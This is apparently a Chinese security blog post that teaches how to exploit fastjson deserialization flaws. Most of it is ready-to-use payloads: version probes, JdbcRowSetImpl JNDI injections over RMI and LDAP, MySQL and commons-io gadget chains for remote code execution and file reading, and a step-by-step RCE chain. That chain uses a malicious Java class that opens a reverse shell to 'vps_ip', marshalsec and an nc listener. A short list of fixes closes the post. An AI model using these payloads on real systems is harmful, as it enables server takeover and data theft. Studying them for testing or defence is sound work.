#  一文学会fastjson漏洞   
simple学安全  simple学安全   2024-12-04 02:55  
  
目录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibpjMqOVNILc9A6Apcc9qJUONpX34sDfEKu5iapFqtlP6ib2HIRMljUPQ507EbxA4PbMPSmlnbSmwiag/640?wx_fmt=png&from=appmsg "")  
  
漏洞简介  
  
fastjson是一个高性能的json解析器和生成器，广泛用于Java项目中。fastjson允许开发者自定义反序列化行为，以便可以根据json中的不同字段自动创建不同类型的对象。  
  
在Java中，反序列化是将字节数据(通常是json格式)转化回对象的过程。然而，fastjson在执行反序列化时，没有对json数据字段做足够的安全检查，攻击者可以构造包含恶意类的json数据，控制反序列化过程中的类加载和方法调用，从而执行恶意代码。  
  
漏洞利用  
  
1、**判断fastjson版本**  
  
1）不同版本的fastjson适用的payload不同，可以根据可使用的payload来判断版本，例如 <1.2.43支持：  
```
{"@type":"java.net.URL","val":"http://dnslog"}
```  
  
<1.2.48支持：  
```
{"@type":"java.net.InetAddress","val":"http://dnslog"}
```  
  
2）有些通过报错信息返回fastjson版本，破坏json结构，导致报错：  
```
{"@type":"java.lang.AutoCloseable"
```  
  
2、**<=1.2.24 payload**  
```
{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"rmi://vps_ip:port/TouchFile",
  "autoCommit":true
}
```  
```
{
  "a":{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"rmi://vps_ip:port/TouchFile",
    "autoCommit":true
  }
}
```  
```
{
  "@type":"com.alibaba.fastjson.JSONObject",
  {
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"rmi://vps_ip:port/TouchFile",
    "autoCommit":true
  }
}
```  
  
3、**<=1.2.47 payload**  
  
1.2.47版本的payload，在之前的基础上做了绕过和变形，新增用@type指定java.lang.Class类，该类是Java反射机制的基础，能动态加载目标类，可以使用该类动态加载JdbcRowSetImpl类，从而达到绕过的效果。  
```
{
  "a":{
    "@type":"java.lang.Class",
    "val":"com.sun.rowset.JdbcRowSetImpl"
  },
  "b":{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"ldap://vps_ip:port/TouchFile",
    "autoCommit":true
  }
}
```  
```
{
  "@type":"com.alibaba.fastjson.JSONObject",
  {
    "a":{
      "@type":"java.lang.Class",
      "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
      "@type":"com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName":"ldap://vps_ip:port/TouchFile",
      "autoCommit":true
    }
  }
}
```  
  
4、**高版本payload**  
  
在高版本的fastjson中，>=1.2.48版本中，autotype默认关闭，防止不受信任的类被实例化；如果要开启autotype，则必须启用黑白名单防护，只允许安全的类被反序列化。那么想要利用高版本fastjson漏洞，关键在于找到可利用的类，在白名单中，并且能被实例化。  
  
1）**autotype原理**  
  
autotype关闭情况下，先判断类是否在Mapping或者deserializers.findClass()中，若在，则允许实例化；若不在则判断是否在白名单中，若在白名单中，则允许实例化，否则不允许。  
  
autotype开启情况下，直接判断类是否在白名单中，若在，则允许实例化；若不在，则不允许。  
  
2）判断autotype是否开启  
  
使用如下数据可以判断，其中用到java.net.URL类，这个类在黑名单中，在autotype开启的情况下，dnslog不会有响应；若autotype是关闭的，则会判断该类是否在Mapping中，而这个类刚好在，因此可以实例化，dnslog也就有响应。  
```
{"@type":"java.net.URL","val":"http://dnslog"}
```  
  
3）判断哪些类可以使用  
  
根据返回包内容判断，例如用@type指定类为JdbcRowSetImpl，返回包提示autotype is not support，则该类无法使用；若返回create instance error，则说明该类可以使用，可能是由于缺少参数，导致实例化出错。  
```
{"@type":"com.sun.rowset.JdbcRowSetImpl"}
```  
  
4）如下两种类不在Mapping中，但是在白名单中，在autotype关闭的情况下，可以利用：一个是mysql的连接类：com.mysql.jdbc.JDBC4Connection(可RCE)、另一个是commons-io的类：org.apache.commons.io.input.BOMInputStream(可读取文件)  
  
5）利用MYSQL连接类  
```
{
  "a":{
    "@type":"com.alibaba.fastjson.JSONObject",
    {
      {
        "@type":"java.lang.AutoCloseable",
        "@type":"com.mysql.jdbc.JDBC4Connection",
        "hostToConnectTo":"vps_ip",
        "portToConnectTo":3306,
        "info":{
          "user":"yso_CommonsCollections5_calc",
          "password":"pass",
          "statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
          "autoDeserialize":"true",
          "NUM_HOSTS":"1"
        },
        "databaseToConnectTo":"dbname",
        "url":""
      }
    }
  }
}
```  
  
其中info中的user字段的值为ysoserial的利用链类型，根据情况选择；  
  
6）利用commons-io  
```
{
  "a":{
    "@type":"java.lang.AutoCloseable",
    "@type":"org.apache.commons.io.input.BOMInputStream",
    "delegate":{
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"jdk.nashorn.api.scripting.URLReader",
        "url":"netdoc:///e:/readfile/"
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
    "boms":[{
      "charsetName":"UTF-8",
      "bytes":[99]
    }]
    },
    "address":{
      "$ref":"$.abc.BOM"
    }
}
```  
  
其中url字段的值为想要读取的路径；bytes数组的值为路径名称的ASCII码  
  
5、**RCE过程**  
  
1）准备恶意的java文件TouchFile.java  
```
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"/bin/bash","-c","bash -i >& /dev/tcp/vps_ip/2333 0>&1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```  
  
2）将java文件编译为class  
```
javac TouchFile.java
```  
  
3）在class文件所在目录，开启http服务  
```
python -m SimpleHTTPServer 80
```  
  
4）开启RMI服务  
  
使用工具：marshalsec  
```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://vps_ip/#TouchFile 9999
```  
  
其中http://vps_ip/#TouchFile 是刚刚开启的http服务，下载恶意类TouchFile  
  
9999是开启RMI服务的端口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibpjMqOVNILc9A6Apcc9qJUmQZf9qaJZp2tJiasRys5JQGrHMhdGGA2ia92caBg5hhWcTz8o8usHjDw/640?wx_fmt=png&from=appmsg "")  
  
5）开启nc监听  
```
nc -lvp 2333
```  
  
6）访问漏洞点，提交payload  
```
{
    "a":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://vps_ip:9999/TouchFile",
        "autoCommit":true
    }
}
```  
  
7）触发exp，成功反弹shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUibpjMqOVNILc9A6Apcc9qJUM9X5B00lav7Lo55OrLYaaS63mVkVMpvLUjvqBzBc7qflud1mUnojXA/640?wx_fmt=png&from=appmsg "")  
  
fastjson不出网无回显  
  
关键在于利用间接方式回显信息  
  
1、写文件，将结果保存在网站文件中，例如js文件中，然后访问js文件获得结果  
  
2、利用内网服务，将结果发送到内网服务器或数据库  
  
3、利用持久化手段，例如定时任务、RMI等  
  
修复建议  
  
1、禁用autotype功能，防止加载不受信任的类  
  
2、升级fastjson版本  
  
3、对外部输入做严格验证，确保只反序列化信任的数据源  
  
4、限制反序列化过程中的代码执行权限  
  
END  
  
**查看更多精彩内容，关注**  
**simple学安全**  
  
  
